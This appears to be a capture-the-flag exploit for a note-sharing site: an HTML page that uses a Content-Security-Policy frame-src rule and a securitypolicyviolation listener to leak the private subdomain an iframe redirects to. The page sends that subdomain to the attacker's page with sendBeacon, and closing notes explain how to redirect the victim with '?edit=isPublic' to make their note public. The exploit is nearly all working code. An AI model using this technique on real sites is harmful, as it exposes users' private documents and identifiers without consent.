"""
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="frame-src 'self' xn--pd-viaaa.space;">
    <title>TEST</title>
</head>

<body>
    <script>
        document.addEventListener('securitypolicyviolation', async function (event) {
            console.log(event)
            navigator.sendBeacon(location.href,event.blockedURI+'?edit=isPublic')
        });      
    </script>
    <iframe src="https://päääd.space/p/latest"></iframe>
</body>

</html>
"""

"""
1) /p/latest will redirect to the unique_id.paaad.space

2) so using csp frame-src we can detect redirects , and report uri to our attacker controlled domain 

3) and then using the leaked subdomain , we can send a meta redirect with ?edit=isPublic
"""
